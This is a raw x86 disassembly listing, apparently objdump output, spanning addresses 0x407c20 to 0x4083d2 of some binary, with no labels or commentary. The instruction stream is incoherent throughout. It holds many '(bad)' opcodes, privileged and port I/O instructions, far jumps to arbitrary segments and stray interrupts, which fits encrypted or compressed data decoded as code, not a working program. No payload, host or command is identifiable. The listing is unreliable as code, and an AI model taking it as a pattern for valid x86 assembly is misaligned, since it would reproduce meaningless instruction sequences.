  407c20:	arpl   WORD PTR [edi-0x639327c0],ax
  407c26:	daa    
  407c27:	push   esi
  407c28:	and    al,bh
  407c2a:	(bad)  
  407c2b:	int3   
  407c2c:	mov    eax,ds:0x562ae8d5
  407c31:	in     al,0x1b
  407c33:	sub    edx,DWORD PTR [ebx+0x7b]
  407c36:	inc    eax
  407c37:	jmp    0x604e5567
  407c3c:	adc    edx,DWORD PTR ss:[esi]
  407c3f:	pop    ecx
  407c40:	sti    
  407c41:	sbb    DWORD PTR [esi+eiz*2-0x2c],ebx
  407c45:	es xchg ecx,eax
  407c47:	jbe    0x407c4f
  407c49:	(bad)  
  407c4a:	mov    ebx,0xff07f6b7
  407c4f:	(bad)  
  407c50:	fstp   DWORD PTR [ebx-0x7]
  407c53:	loopne 0x407c10
  407c55:	int3   
  407c56:	out    dx,al
  407c57:	int3   
  407c58:	fsubr  DWORD PTR [ebx]
  407c5a:	inc    edi
  407c5b:	clc    
  407c5c:	fistp  QWORD PTR [esi]
  407c5e:	aaa    
  407c5f:	(bad)  
  407c60:	shl    DWORD PTR [eax],1
  407c62:	inc    ebx
  407c63:	or     al,cl
  407c65:	(bad)  
  407c66:	out    dx,eax
  407c67:	mov    al,bh
  407c69:	sbb    BYTE PTR [eax+ebp*4],ch
  407c6c:	mov    eax,ds:0x25194ee9
  407c71:	out    dx,eax
  407c72:	jle    0x407cdb
  407c74:	push   cs
  407c75:	out    0x5b,al
  407c77:	adc    cl,BYTE PTR [esp+ebx*1+0x646cea06]
  407c7e:	clc    
  407c7f:	pop    edx
  407c80:	fild   WORD PTR [ebx]
  407c82:	bound  ecx,QWORD PTR [esi]
  407c84:	aaa    
  407c85:	adc    DWORD PTR [ebx],esi
  407c87:	addr16 call 0x1bd3:0x931acd6
  407c8f:	std    
  407c90:	mov    ebx,DWORD PTR [ebx-0x51]
  407c93:	sub    BYTE PTR [edi],al
  407c95:	dec    eax
  407c96:	xor    ebp,eax
  407c98:	dec    ebp
  407c99:	jnp    0x407ca7
  407c9b:	(bad)  
  407c9c:	dec    edi
  407c9d:	mov    bh,0xd9
  407c9f:	enter  0x8297,0x22
  407ca3:	call   0xb763:0xc3598fb3
  407caa:	mov    dl,0xda
  407cac:	or     eax,0x653abd4
  407cb1:	xor    esp,DWORD PTR [ecx-0x6a]
  407cb4:	mov    WORD PTR [eax],ss
  407cb6:	push   edx
  407cb7:	out    0x1c,eax
  407cb9:	sha1rnds4 xmm5,XMMWORD PTR [ecx],0x5d
  407cbe:	ret    
  407cbf:	xlat   BYTE PTR ds:[ebx]
  407cc0:	inc    ebp
  407cc1:	inc    esp
  407cc2:	add    al,0x6a
  407cc4:	pusha  
  407cc5:	icebp  
  407cc6:	pop    esi
  407cc7:	(bad)  
  407cc8:	das    
  407cc9:	pop    ds
  407cca:	pop    edi
  407ccb:	jl     0x407cf5
  407ccd:	fdivr  DWORD PTR [ebp-0x4a5431b9]
  407cd3:	xchg   esp,eax
  407cd4:	jmp    0xe161:0xfcd22ad0
  407cdb:	in     eax,0xe2
  407cdd:	adc    al,0x8c
  407cdf:	stos   DWORD PTR es:[edi],eax
  407ce0:	repnz and DWORD PTR [edx],esp
  407ce3:	mov    bl,0x9d
  407ce5:	sahf   
  407ce6:	pop    eax
  407ce7:	pop    ebp
  407ce8:	push   0x4893028f
  407ced:	std    
  407cee:	sub    ecx,ecx
  407cf0:	adc    al,0x68
  407cf2:	out    dx,al
  407cf3:	int    0x64
  407cf5:	repz call 0xee7844fa
  407cfb:	pop    eax
  407cfc:	clc    
  407cfd:	int3   
  407cfe:	cmp    eax,0xb4756ea0
  407d03:	into   
  407d04:	lods   al,BYTE PTR ds:[esi]
  407d05:	repnz iret 
  407d07:	iret   
  407d08:	xchg   ecx,eax
  407d09:	mov    ds:0xaeb4f492,al
  407d0e:	clc    
  407d0f:	adc    edi,DWORD PTR [esi+0x44e3e71b]
  407d15:	nop
  407d16:	lea    eax,[ebx+esi*8]
  407d19:	sbb    edx,DWORD PTR [edx+ebp*4]
  407d1c:	push   edx
  407d1d:	aam    0xc6
  407d1f:	cld    
  407d20:	(bad)  
  407d21:	in     al,dx
  407d22:	dec    DWORD PTR [ecx-0x16025821]
  407d28:	lock pop edi
  407d2a:	aaa    
  407d2b:	push   0x6
  407d2d:	lahf   
  407d2e:	cld    
  407d2f:	and    BYTE PTR [ebp+edi*4+0x4b],dl
  407d33:	inc    ecx
  407d34:	nop
  407d35:	dec    edi
  407d36:	push   esi
  407d37:	add    al,0xd6
  407d39:	push   ebx
  407d3a:	sar    DWORD PTR es:[eax+0x69eca250],cl
  407d41:	mov    edx,DWORD PTR [bx-0x3f00]
  407d46:	xchg   ebx,eax
  407d47:	outs   dx,DWORD PTR ds:[esi]
  407d48:	xor    ah,ah
  407d4a:	jp     0x407d67
  407d4c:	lock sbb bh,cl
  407d4f:	sub    eax,0x91fca4b1
  407d54:	repz and cl,BYTE PTR [eax]
  407d57:	push   edi
  407d58:	mov    eax,0x98425672
  407d5d:	inc    ebp
  407d5e:	(bad)  
  407d5f:	enter  0x7edd,0x9d
  407d63:	xchg   esi,eax
  407d64:	std    
  407d65:	mov    edi,ecx
  407d67:	pop    ecx
  407d68:	inc    ax
  407d6a:	xchg   ecx,eax
  407d6b:	jg     0x407d62
  407d6d:	int3   
  407d6e:	(bad)  
  407d6f:	add    BYTE PTR [ecx],0x86
  407d72:	lahf   
  407d73:	ror    DWORD PTR [ebp-0x52b40f63],1
  407d79:	and    ebx,esp
  407d7b:	sbb    ch,dh
  407d7d:	ds jns 0x407d5d
  407d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d81:	daa    
  407d82:	call   DWORD PTR [ebp+0x5a]
  407d85:	inc    esi
  407d86:	nop
  407d87:	(bad)  
  407d88:	xchg   edi,eax
  407d89:	add    al,0x33
  407d8b:	or     cl,BYTE PTR [ecx-0x13]
  407d8e:	cmp    eax,0xecd4f9fe
  407d93:	arpl   WORD PTR [eax],di
  407d95:	and    BYTE PTR [ebp+ebx*8-0x65b0c90c],bh
  407d9c:	or     eax,esi
  407d9e:	outs   dx,DWORD PTR ds:[esi]
  407d9f:	and    ebp,ebp
  407da1:	sbb    edx,DWORD PTR [eax-0xc49a69]
  407da7:	outs   dx,DWORD PTR ds:[esi]
  407da8:	aaa    
  407da9:	xchg   edx,eax
  407daa:	sub    bh,BYTE PTR [esi-0x6e]
  407dad:	clc    
  407dae:	push   ebp
  407daf:	adc    edx,DWORD PTR gs:[edx+0x4fc1ba8e]
  407db6:	sbb    DWORD PTR [esi-0x72909c08],ecx
  407dbc:	xchg   ebx,eax
  407dbd:	lea    eax,[eax]
  407dbf:	loope  0x407d51
  407dc1:	add    BYTE PTR [eax-0x9240397],bl
  407dc7:	jns    0x407d5f
  407dc9:	mov    dl,0xbc
  407dcb:	mul    DWORD PTR [edi+0x4b]
  407dce:	sub    DWORD PTR [edi-0x1788768c],ebx
  407dd4:	shr    ebx,0xab
  407dd7:	ss cmp al,0xe4
  407dda:	ret    0xcf0b
  407ddd:	adc    al,0x35
  407ddf:	ficomp DWORD PTR [eax-0x603e006d]
  407de5:	jbe    0x407df4
  407de7:	jg     0x407dba
  407de9:	test   edx,ecx
  407deb:	popf   
  407dec:	dec    eax
  407ded:	addr16 iret 
  407def:	rcr    BYTE PTR [edi],cl
  407df1:	cld    
  407df2:	lahf   
  407df3:	scas   eax,DWORD PTR es:[edi]
  407df4:	(bad)  
  407df5:	imul   esp,DWORD PTR [ebx-0x1f],0xffffffae
  407df9:	ret    0x501f
  407dfc:	nop
  407dfd:	mov    dl,0xb0
  407dff:	mov    WORD PTR [edx-0xb],ds
  407e02:	adc    al,0xf9
  407e04:	popf   
  407e05:	setno  BYTE PTR [edx-0x243aead2]
  407e0c:	adc    ch,dl
  407e0e:	pop    gs
  407e10:	xchg   BYTE PTR [esi-0xd],dh
  407e13:	(bad)  
  407e14:	pop    edi
  407e15:	(bad)  
  407e16:	mov    esp,0xd0077fd4
  407e1b:	sar    DWORD PTR ds:0x817c9fd5,1
  407e21:	jno    0x407e7b
  407e23:	jae    0x407e41
  407e25:	fisub  DWORD PTR [ebp+0x16d516ae]
  407e2b:	sbb    esp,0x151be1df
  407e31:	xchg   edi,eax
  407e32:	push   es
  407e33:	loopne 0x407de8
  407e35:	xor    al,0xd0
  407e37:	ret    0x8104
  407e3a:	out    dx,eax
  407e3b:	push   es
  407e3c:	xchg   esi,eax
  407e3d:	xor    eax,DWORD PTR [ebx]
  407e3f:	adc    ebp,DWORD PTR [ebx-0x73d53721]
  407e45:	xchg   edx,eax
  407e46:	rcl    DWORD PTR [ecx+0x711235cd],0x7f
  407e4d:	add    BYTE PTR [eax+eax*1-0x1],ch
  407e51:	cmp    eax,0x1861c41a
  407e56:	add    bh,dl
  407e58:	sbb    esp,DWORD PTR [edi]
  407e5a:	inc    ebp
  407e5b:	cmp    dl,BYTE PTR [eax-0x15]
  407e5e:	aad    0xb2
  407e60:	xchg   edx,eax
  407e61:	fs jmp 0x6c3b:0xca094dcf
  407e69:	and    cl,BYTE PTR ds:0x995bf998
  407e6f:	loopne 0x407e47
  407e71:	mov    cr7,esp
  407e74:	inc    ebx
  407e75:	hlt    
  407e76:	jecxz  0x407dfe
  407e78:	mov    dh,0x91
  407e7a:	xchg   edx,eax
  407e7b:	cmp    BYTE PTR [esi+0x43a190bb],ch
  407e81:	cdq    
  407e82:	ds jnp 0x407e62
  407e85:	stc    
  407e86:	fcom   QWORD PTR [ebp+0x1f22f92b]
  407e8c:	mov    bl,0x47
  407e8e:	sbb    ecx,DWORD PTR [edi-0x292a3738]
  407e94:	in     al,dx
  407e95:	sub    ecx,edi
  407e97:	daa    
  407e98:	push   ss
  407e99:	add    DWORD PTR [ebp-0x14ee1898],ebx
  407e9f:	jge    0x407e94
  407ea1:	lock leave 
  407ea3:	aaa    
  407ea4:	cli    
  407ea5:	retf   0x4a50
  407ea8:	cmc    
  407ea9:	or     eax,0x1a00a930
  407eae:	jb     0x407f27
  407eb0:	sti    
  407eb1:	gs jle 0x407e77
  407eb4:	shl    DWORD PTR [ebx+ebp*8+0x3b67eb8d],cl
  407ebb:	adc    al,0x5a
  407ebd:	mov    al,0xbb
  407ebf:	adc    BYTE PTR ds:0xc0feeca7,ah
  407ec5:	fsubr  QWORD PTR [edx+edi*2]
  407ec8:	cmp    edi,DWORD PTR [edx+0x79]
  407ecb:	sub    DWORD PTR [edx],edi
  407ecd:	and    eax,edi
  407ecf:	ret    
  407ed0:	imul   eax,DWORD PTR [ebx+eax*4+0x17b312f3],0x9bb8a10c
  407edb:	outs   dx,DWORD PTR ds:[esi]
  407edc:	ins    DWORD PTR es:[edi],dx
  407edd:	fld    QWORD PTR [ecx]
  407edf:	scas   al,BYTE PTR es:[edi]
  407ee0:	xor    bh,BYTE PTR [edi]
  407ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ee4:	neg    DWORD PTR [ebx+0x241f0074]
  407eea:	in     eax,dx
  407eeb:	(bad)  
  407eec:	fwait
  407eed:	dec    edx
  407eee:	iret   
  407eef:	fdivp  st(0),st
  407ef1:	sti    
  407ef2:	sbb    al,0x38
  407ef4:	sub    BYTE PTR [edx+0x3cd610bd],ch
  407efa:	push   cs
  407efb:	mov    bl,0xf
  407efd:	mov    ah,0x58
  407eff:	out    0xbb,al
  407f01:	ret    0x17eb
  407f04:	push   ss
  407f05:	iret   
  407f06:	sbb    eax,0x72925ed
  407f0b:	cwde   
  407f0c:	xlat   BYTE PTR ds:[ebx]
  407f0d:	mov    dl,0xd8
  407f0f:	shr    DWORD PTR [ebp-0x17c38f37],cl
  407f15:	setnp  BYTE PTR [esi+0x55]
  407f19:	push   0x64
  407f1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407f1c:	cmc    
  407f1d:	mov    BYTE PTR [edi-0x45520cd2],cl
  407f23:	dec    ebp
  407f24:	push   cs
  407f25:	push   ss
  407f26:	xchg   DWORD PTR [ebp-0x5c822ec5],ebp
  407f2c:	mov    al,0xd7
  407f2e:	cli    
  407f2f:	xchg   DWORD PTR [ecx-0x29],ebp
  407f32:	in     eax,0x5b
  407f34:	es push cs
  407f36:	outs   dx,DWORD PTR ds:[esi]
  407f37:	add    al,0xde
  407f39:	mov    dl,0xc9
  407f3b:	xor    esp,DWORD PTR [edi+0x44c14cbc]
  407f41:	add    al,0x5b
  407f43:	cmp    DWORD PTR ds:0x5943301f,eax
  407f49:	cmp    al,0x3d
  407f4b:	cmp    eax,0x352cf389
  407f50:	test   BYTE PTR [ecx+0x19],cl
  407f53:	jp     0x407f9e
  407f55:	pop    ecx
  407f56:	xor    eax,0x6524c6c2
  407f5b:	(bad)  
  407f5c:	sahf   
  407f5d:	jo     0x407f37
  407f5f:	rcr    BYTE PTR [ebp+0x49],0x21
  407f63:	and    BYTE PTR [edx+esi*2-0x1caa9598],ch
  407f6a:	push   esp
  407f6b:	mov    ds:0x7effd7df,al
  407f70:	stc    
  407f71:	pop    ds
  407f72:	loopne 0x407f89
  407f74:	(bad)  
  407f75:	repnz or ah,ch
  407f78:	add    edx,DWORD PTR [edi-0x445e2109]
  407f7e:	jmp    0x407fa7
  407f80:	pop    edi
  407f81:	test   esp,esp
  407f83:	xchg   ebx,eax
  407f84:	inc    ebp
  407f85:	rol    dl,1
  407f87:	pusha  
  407f88:	pop    ebx
  407f89:	dec    ebp
  407f8a:	iret   
  407f8b:	dec    ebx
  407f8c:	(bad)  
  407f8d:	ja     0x407f90
  407f8f:	rol    BYTE PTR [esi],cl
  407f91:	call   0x85e0:0xc8c9f11c
  407f98:	out    0xbd,al
  407f9a:	pop    es
  407f9b:	push   esp
  407f9c:	mov    cl,0x9b
  407f9e:	ja     0x407f73
  407fa0:	xor    ebx,edi
  407fa2:	xchg   DWORD PTR [edx-0x2bbc0edb],eax
  407fa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fa9:	stc    
  407faa:	sub    al,0xde
  407fac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fad:	xor    al,ah
  407faf:	(bad)  
  407fb0:	int3   
  407fb1:	jbe    0x407f61
  407fb3:	(bad)  
  407fb4:	retf   0xb9d1
  407fb7:	scas   eax,DWORD PTR es:[edi]
  407fb8:	in     eax,0x36
  407fba:	sar    DWORD PTR [edx-0x2f4ce433],0x80
  407fc1:	or     eax,0xd3cc75a2
  407fc6:	jl     0x407fbb
  407fc8:	adc    DWORD PTR [esp+ebx*4-0x4b104b7d],ebp
  407fcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fd0:	jno    0x407fbb
  407fd2:	jecxz  0x407fd5
  407fd4:	mov    ah,0x76
  407fd6:	dec    edi
  407fd7:	add    al,0xb4
  407fd9:	add    eax,0x29f5f76b
  407fde:	or     edx,esi
  407fe0:	(bad)  
  407fe1:	mov    esp,0x63a329c2
  407fe6:	push   ebx
  407fe7:	(bad)  
  407fe8:	dec    eax
  407fe9:	inc    ecx
  407fea:	or     eax,0x8d971245
  407fef:	dec    ebx
  407ff0:	arpl   WORD PTR [eax-0x5e],bp
  407ff3:	cmp    BYTE PTR [ecx],ah
  407ff5:	inc    esp
  407ff6:	cmp    al,0xad
  407ff8:	(bad)  
  407ff9:	and    al,0x6a
  407ffb:	into   
  407ffc:	or     ecx,DWORD PTR [eax]
  407ffe:	stos   BYTE PTR es:[edi],al
  407fff:	loopne 0x40805e
  408001:	and    ah,BYTE PTR [edi]
  408003:	push   edi
  408004:	mov    bh,0x32
  408006:	mov    cs,WORD PTR [edx]
  408008:	in     eax,0x73
  40800a:	pushf  
  40800b:	mov    eax,ds:0x969ac4d8
  408010:	leave  
  408011:	adc    BYTE PTR [ebx],ch
  408013:	inc    eax
  408014:	xor    ebx,DWORD PTR [edi+esi*1-0x2]
  408018:	mov    al,0x2d
  40801a:	and    DWORD PTR [ebx+ebx*4],edx
  40801d:	(bad)  
  40801e:	lods   al,BYTE PTR ds:[esi]
  40801f:	ss in  eax,0xc6
  408022:	or     eax,0x3801104
  408027:	mov    edi,0x9efa64a9
  40802c:	(bad)  
  40802d:	mov    esi,0x23991f96
  408032:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408033:	mov    bl,0x44
  408035:	cmp    dh,al
  408037:	adc    DWORD PTR [edi],0xffffff89
  40803a:	push   ebp
  40803b:	ret    0x7396
  40803e:	push   ecx
  40803f:	ret    
  408040:	(bad)  
  408041:	xchg   esp,eax
  408042:	dec    ebx
  408043:	push   esp
  408044:	nop
  408045:	push   edi
  408046:	rcl    DWORD PTR [ebp-0x76],1
  408049:	pop    eax
  40804a:	mov    cl,0x20
  40804c:	adc    DWORD PTR [eax],esp
  40804e:	in     al,dx
  40804f:	mov    WORD PTR [ecx+esi*8],gs
  408052:	dec    ebx
  408053:	rcpps  xmm7,XMMWORD PTR [eax+0x46daab7a]
  40805a:	mov    ecx,0x63058a1
  40805f:	enter  0x54af,0x91
  408063:	adc    bl,0x17
  408066:	hlt    
  408067:	idiv   BYTE PTR [edx]
  408069:	iret   
  40806a:	test   BYTE PTR [ebx+0x66ea2e7b],0x86
  408071:	add    dl,0x6e
  408074:	jno    0x4080b1
  408076:	jb     0x408042
  408078:	jecxz  0x408051
  40807a:	test   al,0x16
  40807c:	(bad)  [edx-0x6d]
  40807f:	fwait
  408080:	jmp    0x4678:0x54a32a7f
  408087:	sub    BYTE PTR [ebx],cl
  408089:	push   edx
  40808a:	jb     0x4080b5
  40808c:	jb     0x40808f
  40808e:	repnz inc ecx
  408090:	add    eax,0xa017a8c6
  408095:	pop    DWORD PTR [ebp+0x1c]
  408098:	std    
  408099:	shl    BYTE PTR [edi+0x2d066f37],0xa0
  4080a0:	push   ds
  4080a1:	mov    dh,0x8d
  4080a3:	dec    ecx
  4080a4:	push   ds
  4080a5:	sub    ebx,DWORD PTR [edx]
  4080a7:	sbb    al,0x5
  4080a9:	js     0x408070
  4080ab:	lds    ebp,FWORD PTR [ecx-0x36]
  4080ae:	cmp    BYTE PTR [esi],dh
  4080b0:	leave  
  4080b1:	pop    esi
  4080b2:	retf   0xeaa4
  4080b5:	cmp    ah,0xd8
  4080b8:	mov    cl,0x7e
  4080ba:	nop
  4080bb:	out    dx,eax
  4080bc:	loope  0x408087
  4080be:	xchg   ecx,eax
  4080bf:	data16 outs dx,BYTE PTR ds:[esi]
  4080c1:	andnps xmm0,xmm6
  4080c4:	lods   eax,DWORD PTR ds:[esi]
  4080c5:	pop    edi
  4080c6:	pop    ecx
  4080c7:	nop
  4080c8:	shr    DWORD PTR gs:[eax+0x6277b0f9],cl
  4080cf:	stc    
  4080d0:	pop    di
  4080d2:	adc    ebp,DWORD PTR [ebp-0x3f405af0]
  4080d8:	sahf   
  4080d9:	add    bl,cl
  4080db:	sub    al,0xd1
  4080dd:	shr    BYTE PTR [ebp-0x8],0x2d
  4080e1:	and    eax,0x1eba7f05
  4080e6:	rol    BYTE PTR [eax+0x31],0x8c
  4080ea:	adc    DWORD PTR [esp+esi*2+0x7b],0x6c
  4080ef:	cmp    BYTE PTR ds:[edi],ch
  4080f2:	das    
  4080f3:	popa   
  4080f4:	mov    WORD PTR [edi],?
  4080f6:	sbb    eax,0xb960616f
  4080fb:	adc    al,BYTE PTR [edx]
  4080fd:	aaa    
  4080fe:	fisub  DWORD PTR [edx-0x644b6861]
  408104:	adc    BYTE PTR [ebp-0x47499492],dh
  40810a:	sbb    DWORD PTR [ebx],edi
  40810c:	mulps  xmm7,XMMWORD PTR [edi+0x6e369b59]
  408113:	sbb    DWORD PTR [ebx],0x8caa1d72
  408119:	dec    esp
  40811a:	mov    al,0xd7
  40811c:	(bad)  
  40811e:	rcr    DWORD PTR [eax+eiz*2+0x2c5f2c1d],1
  408125:	(bad)  [ecx]
  408127:	cld    
  408128:	ja     0x4080d1
  40812a:	inc    ebp
  40812b:	out    0xc9,al
  40812d:	cdq    
  40812e:	xchg   BYTE PTR [esi],ah
  408130:	fcmovnb st,st(7)
  408132:	dec    edx
  408133:	in     al,dx
  408134:	gs add al,0x3e
  408137:	imul   ebx,DWORD PTR [eax+0x48],0xffffffcd
  40813b:	dec    ecx
  40813c:	stos   DWORD PTR es:[edi],eax
  40813d:	dec    ebp
  40813e:	xchg   edi,eax
  40813f:	jmp    0x225:0x1f150509
  408146:	scas   eax,DWORD PTR es:[edi]
  408147:	pusha  
  408148:	inc    edi
  408149:	outs   dx,DWORD PTR ds:[esi]
  40814a:	pop    edi
  40814b:	push   es
  40814c:	outs   dx,BYTE PTR ds:[esi]
  40814d:	sub    BYTE PTR [ecx-0x32],cl
  408150:	jno    0x40814c
  408152:	es or  al,0x96
  408155:	xor    BYTE PTR [edi-0x4f1d998],ah
  40815b:	jecxz  0x408183
  40815d:	cmp    eax,0xab61f2d4
  408162:	ret    
  408163:	fwait
  408164:	mov    ch,0x95
  408166:	push   0xffffffe8
  408168:	xor    BYTE PTR [edi-0x1f00904f],ch
  40816e:	inc    ebp
  40816f:	dec    edx
  408170:	lock sbb BYTE PTR ds:[edx+0x16],0x69
  408176:	(bad)  
  408177:	(bad)
  40817b:	addr16 mov eax,ds:0x86a2
  40817f:	(bad)  
  408180:	fs mov ah,0x60
  408183:	sar    BYTE PTR [edi+0x63f6e6ef],1
  408189:	xor    ecx,DWORD PTR [edx+0xf65b088]
  40818f:	fldenv [eax+0xb]
  408192:	cs mov ecx,0x5e35ad5
  408198:	mov    bl,0x47
  40819a:	loop   0x408187
  40819c:	sahf   
  40819d:	scas   eax,DWORD PTR es:[edi]
  40819e:	hlt    
  40819f:	retf   
  4081a0:	add    ah,BYTE PTR [edi+0x4f]
  4081a3:	pop    esp
  4081a4:	mov    cl,BYTE PTR [eax]
  4081a6:	in     eax,0x95
  4081a8:	add    edx,ebx
  4081aa:	retf   
  4081ab:	into   
  4081ac:	test   al,0x4e
  4081ae:	xchg   ecx,eax
  4081af:	leave  
  4081b0:	(bad)  
  4081b1:	icebp  
  4081b2:	in     eax,dx
  4081b3:	pop    ebx
  4081b4:	fistp  QWORD PTR [ecx-0x47]
  4081b7:	sahf   
  4081b8:	dec    esp
  4081b9:	out    dx,al
  4081ba:	mov    edi,0x276ae992
  4081bf:	dec    eax
  4081c0:	fidiv  DWORD PTR [ecx+0x1c7580c8]
  4081c6:	test   al,0xeb
  4081c8:	xchg   ebx,eax
  4081c9:	int    0x29
  4081cb:	loopne 0x408172
  4081cd:	and    DWORD PTR [edi+0x17],edi
  4081d0:	mov    ch,0x47
  4081d2:	inc    ecx
  4081d3:	inc    edi
  4081d4:	sbb    BYTE PTR [ebp-0x14],0x4c
  4081d8:	add    eax,0x563a67cc
  4081dd:	inc    ebx
  4081de:	(bad)  [edx-0x25]
  4081e1:	sbb    al,0x72
  4081e3:	jg     0x40816b
  4081e5:	fbld   TBYTE PTR [ebp-0x42]
  4081e8:	leave  
  4081e9:	jg     0x408203
  4081eb:	mov    dh,0xa2
  4081ed:	and    DWORD PTR [edx+0x7e6664d2],esp
  4081f3:	outs   dx,BYTE PTR ds:[esi]
  4081f4:	test   al,0x1b
  4081f6:	dec    edx
  4081f7:	jo     0x40822b
  4081f9:	repz mov ecx,0xe1e065e7
  4081ff:	mov    eax,ebx
  408201:	cmp    al,ah
  408203:	jb     0x40823d
  408205:	add    BYTE PTR [ebp-0x65],bl
  408208:	out    0x78,eax
  40820a:	repnz push eax
  40820c:	sbb    al,BYTE PTR [ebp+0x54]
  40820f:	retf   
  408210:	jae    0x408259
  408212:	rcr    DWORD PTR [edi],1
  408214:	adc    eax,0x38697120
  408219:	adc    eax,ebx
  40821b:	sbb    DWORD PTR [edx+0x18],esp
  40821e:	arpl   WORD PTR [ebx-0x5d],bp
  408221:	mov    edx,0x9b4a8547
  408226:	popf   
  408227:	ja     0x40821c
  408229:	add    ah,BYTE PTR [ebx-0x4e]
  40822c:	mov    al,0xd7
  40822e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40822f:	pop    es
  408230:	add    DWORD PTR [ebp-0x3d],0x98e1fd14
  408237:	push   es
  408238:	mov    ds,WORD PTR [ebx]
  40823a:	imul   esp,ebp,0xffffff98
  40823d:	inc    eax
  40823e:	mov    eax,ds:0xf5c95a23
  408243:	add    DWORD PTR [ecx-0x475566c6],0x66
  40824a:	jno    0x4081ef
  40824c:	add    esi,DWORD PTR [ebx-0x15]
  40824f:	(bad)  
  408250:	out    0x7c,eax
  408252:	fcom   QWORD PTR [ebx]
  408254:	cli    
  408255:	mov    bh,bl
  408257:	(bad)  
  408258:	mov    al,ds:0xfb181753
  40825d:	pop    ds
  40825e:	aaa    
  40825f:	cmp    BYTE PTR [ebx-0x7d],ah
  408262:	popf   
  408263:	test   esp,0x741e8dba
  408269:	inc    edx
  40826a:	cmp    eax,0xb289eef7
  40826f:	jb     0x4082de
  408271:	and    ah,cl
  408273:	cmp    DWORD PTR [esi+esi*4],ecx
  408276:	pop    ecx
  408277:	pushf  
  408278:	retf   
  408279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40827a:	inc    edx
  40827b:	and    al,0xa4
  40827d:	lock dec edi
  40827f:	cs xor eax,0x76223d09
  408285:	inc    ebx
  408286:	out    0x3f,eax
  408288:	mov    esp,DWORD PTR [ebx]
  40828a:	aas    
  40828b:	jle    0x4082ed
  40828d:	dec    edx
  40828e:	div    BYTE PTR [edi-0x4c899a53]
  408294:	sbb    bh,BYTE PTR [ecx+0x28]
  408297:	pop    ebp
  408298:	(bad)  [edi-0x266230e8]
  40829e:	jmp    0xb87a:0x1c2254f
  4082a5:	jge    0x4082a5
  4082a7:	mov    edx,0x5b694afe
  4082ac:	mov    eax,ds:0xbca81f58
  4082b1:	lods   eax,DWORD PTR ds:[esi]
  4082b2:	imul   edi,DWORD PTR [eax+0x2b],0xd063e6e8
  4082b9:	and    eax,0xd2daaa02
  4082be:	rcl    BYTE PTR [esi-0x37c3e852],cl
  4082c4:	adc    bl,0xf4
  4082c7:	push   0x71d79694
  4082cc:	sub    al,0xb8
  4082ce:	pop    ecx
  4082cf:	adc    DWORD PTR [ebx],0xc8afcb9c
  4082d5:	lahf   
  4082d6:	jle    0x4082ed
  4082d8:	add    ah,BYTE PTR [edi+0x57a8337c]
  4082de:	jp     0x408337
  4082e0:	mov    ebx,0x7497ceb1
  4082e5:	scas   al,BYTE PTR es:[edi]
  4082e6:	push   ss
  4082e7:	int    0xe7
  4082e9:	and    DWORD PTR [eax+0x3827f4d],eax
  4082ef:	imul   esp,DWORD PTR [esi+eiz*4+0x41a2d6c],0x8
  4082f7:	(bad)  
  4082f8:	hlt    
  4082f9:	cmp    al,0x5f
  4082fb:	xor    dl,ah
  4082fd:	neg    BYTE PTR [edi+eax*4+0x19a06f4e]
  408304:	pop    esp
  408305:	lea    edx,[esi+ebx*8+0x2cbbfb43]
  40830c:	xchg   ebx,eax
  40830d:	add    al,0x8d
  40830f:	shl    DWORD PTR [ecx],0x4a
  408312:	ret    0x14a0
  408315:	pop    ecx
  408316:	clc    
  408317:	push   es
  408318:	jne    0x40832c
  40831a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40831b:	ror    BYTE PTR [bx-0x6f1c],1
  408320:	pop    ss
  408321:	cmc    
  408322:	push   ds
  408323:	or     DWORD PTR [esi-0x4e8fb08],edx
  408329:	cmp    eax,0x12689727
  40832e:	or     bh,BYTE PTR [ebx]
  408330:	mov    dl,0xc8
  408332:	addr16 jae 0x408377
  408335:	retf   0xe86f
  408338:	dec    esp
  408339:	mov    dh,0xf2
  40833b:	shl    BYTE PTR [ebx-0x47],0x15
  40833f:	cmc    
  408340:	or     DWORD PTR [esi-0x48f9c5f5],0xf3854ba
  40834a:	pop    edx
  40834b:	je     0x40832b
  40834d:	rcr    DWORD PTR [ebp-0x7dc8a3b2],0xa2
  408354:	xchg   edx,eax
  408355:	fiadd  WORD PTR [edx+eiz*2-0x642fd976]
  40835c:	add    ch,bh
  40835e:	not    DWORD PTR [ebx+0x5]
  408361:	push   ss
  408362:	or     eax,0x2d67f43d
  408367:	mov    dl,0x9d
  408369:	fistp  WORD PTR [ecx-0x16]
  40836c:	add    bl,dh
  40836e:	sub    ch,BYTE PTR [edx-0xa437285]
  408374:	ret    
  408375:	cmp    eax,0x56824118
  40837a:	pushf  
  40837b:	and    DWORD PTR [ebx-0x51b2f80d],esp
  408381:	mov    ds:0xd0e0da,eax
  408386:	(bad)  [esi+eax*1-0x67]
  40838a:	scas   eax,DWORD PTR es:[edi]
  40838b:	xor    eax,0xc6b8448c
  408390:	fidivr WORD PTR [esi]
  408392:	add    bl,cl
  408394:	sbb    eax,0xd9361fe5
  408399:	inc    BYTE PTR [edx-0x4bc28710]
  40839f:	mov    ebx,0xfc636b89
  4083a4:	pop    ecx
  4083a5:	ret    0x2524
  4083a8:	dec    ebx
  4083a9:	mov    esi,0x18b3aea6
  4083ae:	add    bh,BYTE PTR [ebp-0x59684831]
  4083b4:	ret    
  4083b5:	xchg   edi,eax
  4083b6:	push   esp
  4083b7:	inc    eax
  4083b8:	mov    WORD PTR [eax],?
  4083ba:	dec    ebx
  4083bb:	add    BYTE PTR [ebp+0xb],al
  4083be:	in     eax,dx
  4083bf:	xchg   esi,eax
  4083c0:	dec    esi
  4083c1:	sub    eax,0x52288b93
  4083c6:	pop    ebx
  4083c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4083c8:	sbb    al,ch
  4083ca:	or     edi,ecx
  4083cc:	out    0xdd,eax
  4083ce:	fwait
  4083cf:	js     0x4083ca
  4083d1:	dec    esp
  4083d2:	mov    eax,0xf716b65e
